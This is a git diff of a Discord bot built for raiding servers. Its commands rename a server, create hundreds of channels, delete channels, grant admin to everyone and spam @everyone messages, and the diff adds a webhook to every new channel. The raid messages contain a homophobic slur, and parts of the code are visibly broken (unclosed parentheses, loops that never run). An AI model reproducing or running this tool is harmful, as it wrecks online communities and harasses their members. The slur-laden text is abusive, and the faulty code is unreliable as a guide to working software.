@@ -2,6 +2,10 @@ const Discord = require("discord.js");
 const client = new Discord.Client();
 const prefix = '$';
 
+client.on("ratelimit", () =>{
+    console.log(`RATELIMIT FODA DMS`)
+}
+
 client.on("ready", () => { 
     console.log(`ready for destroy ppl's days`)
     console.log(`Defoko V3`)
@@ -23,13 +27,22 @@ client.on("message", async (message) => {
             if(!args.slice(0).join(' ')){ 
                 message.guild.setName('haha admin go grr -ags and gs')
                 for(i = 0; i < 499; i++){
-                    message.guild.createChannel('haha admin go grr', 'text')
+                    message.guild.createChannel('haha admin go grr', 'text').then(m =>{
+                        m.createWebhook("get raided faggots").then(w => {
+                            const case1hook = new Discord.WebhookClient(w.id, w.token)
+                            for(let hokeii = 0; hokeii == 5; hokeii++) m.channel.send(`@everyone raided epicclly by padero's private chimera girl`)
+                        })
                     message.guild.createChannel('haha admin go grr', 'voice')
                 }
             } else {
                 message.guild.setName(`${args.slice(0).join(' ')}`)
                 for(i = 0; i < 499; i++){
-                    message.guild.createChannel(`${args.slice(0).join(' ')}`, 'text')
+                    message.guild.createChannel(`${args.slice(0).join(' ')}`, 'text').then(m =>{
+                        m.createWebhook("get raided faggots").then(w => {
+                            const case2hook = new Discord.WebhookClient(w.id, w.token)
+                            for(let hokei = 0; hokei == 5; hokei++) m.channel.send(`@everyone raided epicclly by padero's private chimera girl`)
+                        })
+                    })
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, 'voice')
                 }
             }
@@ -53,7 +66,7 @@ client.on("message", async (message) => {
             message.delete();
             const help = [`Tefoco V3\n`,
             "prefix: $",
-            "$yeet (optional name for the things)- makes a lot of text channels and vcs, and roles, also changes the server's name",
+            "$yeet (optional name for the things)- makes a lot of text channels and vcs, and roles, changes the server's name and pings everyone on the new channels",
             "$del - yeets all the channels and only leaves one",
             "$admall - self explanatory",
             "$servername (new server name) - self explanatory",
@@ -63,6 +76,7 @@ client.on("message", async (message) => {
             message.author.send(`${help.slice(0).join(`\n`)}`).catch(() => message.channel.send(`enable yo dms dumbass`))
         break;
         case "spam":
+            message.delete()
             if(!args[0]) return message.author.send(`how many times`).catch(() => message.channel.send(`enable yo dms dumbass`))
             if(args[0] == isNaN()) return message.author.send(`how many times`).catch(() => message.channel.send(`enable yo dms dumbass`))
             if(!args[1]) return message.author.send(`spam what`).catch(() => message.channel.send(`enable yo dms dumbass`))
